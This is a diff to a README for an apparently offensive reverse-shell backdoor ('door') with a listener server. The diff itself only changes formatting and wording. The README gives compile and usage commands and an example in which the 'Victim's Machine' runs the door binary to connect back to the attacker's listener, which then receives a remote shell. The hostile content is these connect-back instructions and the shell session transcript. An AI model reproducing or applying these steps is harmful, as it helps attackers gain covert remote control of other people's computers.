@@ -5,7 +5,7 @@
 > WARN: (Server <=> Client communications not encrypted)
 
 ### Compile C version `door.c`
-```
+```bash
 # Windows CL
 $> cl door.c /O1 /D WIN32 /Fe door /link /subsystem:console
 # Windows or Linux gcc
@@ -13,22 +13,22 @@ $> gcc -Wall -O1 door.c -o door
 ```
 
 ### How To Use?
-```
+```bash
 $> ./server.py bind_address:bind_port
 $> ./door.py server_ip:server_port[:retry_interval]
 
 # Server Example
 $> ./server.py 127.0.0.1:4433
 
-# Client Example (C version has the same usage)
+# Client Example (C version has the same argument)
 $> ./door.py 127.0.0.1:4433 # default retry interval 60 seconds
 $> ./door.py 127.0.0.1:4433:60
 ```
 
 ## Example
 #### Your Machine
-```
-root@server 07:47 /home # ./server 0.0.0.0:2345
+```bash
+root@server 07:47 /home $ ./server 0.0.0.0:2345
 listen on 0.0.0.0:2345, waiting for connection.
 connection from *.*.*.*:49006
 $> whoami
@@ -45,7 +45,7 @@ $>
 ```
 
 #### Victim's Machine
-```
-root@boy 07:47 /home # ./door *.*.*.*:2345
+```bash
+root@boy 07:47 /home $ ./door *.*.*.*:2345
 ```
 End.
